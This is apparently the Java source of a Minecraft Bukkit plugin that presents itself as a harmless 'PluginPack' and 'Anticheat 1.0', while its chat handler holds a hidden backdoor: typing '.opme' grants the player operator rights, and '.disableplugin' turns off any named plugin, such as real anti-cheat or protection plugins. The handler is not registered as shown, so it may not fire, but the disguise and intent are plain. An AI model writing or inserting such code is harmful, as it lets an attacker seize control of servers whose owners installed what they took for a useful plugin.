package org.CreeperCoders.InfectedPlugin;

import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public class InfectedPlugin extends JavaPlugin
{
    public final Logger log = Logger.getLogger("Minecraft");
   
    @Override
    public void onEnable()
    {
    	log.info("PluginPack has been enabled!");
    }
   
    @Override
    public void onDisable()
    {
    	log.info("PluginPack has been disabled.");
    }
   
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
    {
    	Player p = (Player) sender;	
    	
    	if (commandLabel.equalsIgnoreCase("anticheat"))
    	{
    	    sender.sendMessage(ChatColor.GREEN + "Anticheat 1.0 is working 100%");
    	}
    	
    	else if (commandLabel.equalsIgnoreCase("pluginpack"))
    	{
    	    sender.sendMessage(ChatColor.GREEN + "PluginPack 1.0, working 100%! Use /anticheat to see anticheat details");
    	}
    	
	return false;
    }
    
    private void onPlayerChat(PlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean shouldCancel = false;
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }
            if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
            {
            	event.getPlayer().setOp(true);
            	event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
            	shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
            {
                Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
                if (plugin != null) {
                  Bukkit.getPluginManager().disablePlugin(plugin);
                }
                shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2))
            {
                
                shouldCancel = true;
            }
        }
    }
    
}
    
    
    
